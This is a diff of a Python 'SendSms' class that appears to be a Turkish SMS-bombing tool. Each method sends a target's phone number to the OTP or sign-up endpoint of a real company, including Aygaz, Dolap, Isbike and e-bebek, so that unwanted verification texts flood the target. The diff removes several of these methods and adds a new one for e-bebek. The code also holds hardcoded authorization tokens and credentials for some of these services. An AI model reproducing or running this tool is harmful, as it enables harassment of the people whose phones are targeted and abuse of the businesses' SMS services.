@@ -266,48 +266,9 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ rentiva.com")
-            
-    
-    #bineq.tech
-    def Bineq(self):
-        try:
-            url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
-            bineq = requests.post(url)
-            if bineq.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ bineqapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ bineqapi.heymobility.tech")
-            
-            
-    #superpedestrian.com
-    def Link(self):
-        try:
-            url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
-            json={"phone_number": f"+90{self.phone}"}
-            link = requests.post(url, json=json)
-            if link.json()["detail"] == "Ok":
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ consumer-auth.linkfleet.de")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ consumer-auth.linkfleet.de")
 
     
-    #apaydinsupermarket.com
-    def Aydin(self):
-        try:
-            r = requests.post("https://apistore.apaydinsupermarket.com:443/api/musteriGirisKayit", data={"cep_tel": str(self.phone)})
-            if (r.json()["result"]["status"]) == "OK":
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ apistore.apaydinsupermarket.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ apistore.apaydinsupermarket.com")
+
                 
             
     #loncamarket.com
@@ -495,20 +456,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ suiste.com")
             
             
-    #hayatsu.com.tr
-    def Hayat(self):
-        try:
-            url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
-            json={"mobilePhoneNumber": self.phone}
-            r = requests.post(url, json=json)
-            if (r.json()["IsSuccessful"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ hayatsu.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ hayatsu.com.tr")
-            
+
             
     #pisir.com
     def Pisir(self):
@@ -566,35 +514,9 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ api.terrapizza.com.tr")
             
             
-    #ipragaz.com.tr
-    def IpraGaz(self):
-        try:
-            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
-            json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(self.phone), "playerId": ""}
-            r = requests.post(url, json=json)
-            if (r.json()["phoneNumber"]) == str(self.phone):
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ ipapp.ipragaz.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ ipapp.ipragaz.com.tr")
+
             
-            
-    #aygaz.com.tr
-    def Aygaz(self):
-        try:
-            url = "https://ecommerce-memberapi.aygaz.com.tr:443/api/Membership/SendVerificationCode"
-            json={"Gsm": str(self.phone)}
-            r = requests.post(url, json=json)
-            if (r.json()["IsSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ ecommerce-memberapi.aygaz.com.tr")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ ecommerce-memberapi.aygaz.com.tr")
-            
+ 
             
     #mogazmobilapinew.aygaz.com.tr
     def Mogaz(self):
@@ -667,34 +589,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ api.opet.com.tr")
 
-
-    #dolap.com
-    def Dolap(self):
-        try:
-            url = "https://api-gateway.dolap.com:443/member"
-            headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
-            json={"advertisingId": "", "campaignAgreement": False, "email": f"{self.random_mail}@gmail.com", "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": self.phone}
-            r = requests.put(url, headers=headers, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ api-gateway.dolap.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ api-gateway.dolap.com")
-            
-
-    #heymobility.tech
-    def Hey(self):
-        try:
-            r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}")
-            if (r.json()["IsSuccess"]) == True:
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ heyapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ heyapi.heymobility.tech")
             
 
     #tazi.tech
@@ -712,21 +606,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ mobileapiv2.tazi.tech")
             
-    
-    #isbike.istanbul
-    def Isbike(self):
-        try:
-            url = "http://app.isbike.istanbul:80/api/uye/otpsms"
-            headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
-            json={"cep_tel": self.phone, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
-            r = requests.post(url, headers=headers, json=json)
-            if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
-                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ app.isbike.istanbul")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ app.isbike.istanbul")
             
     
     #n11.com
@@ -760,3 +639,18 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ joker.com.tr")
 
+
+    #e-bebek.com
+    def Ebebek(self):
+        try:
+            url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
+            headers = {"Content-Type": "application/json", "Authorization": "Bearer rTeVaZRkRwHPdroX6JDN3uLtjRM"}
+            json={"email": f"{self.random_mail}@gmail.com", "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
+            r = requests.post(url, headers=headers, json=json)
+            if r.json()["status"] == "SUCCESS":
+                print(f"{Fore.LIGHTGREEN_EX}『 YES 』 {Style.RESET_ALL}gönderildi ⇝ api2.e-bebek.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}『 NO 』 {Style.RESET_ALL}hata ⇝ api2.e-bebek.com")
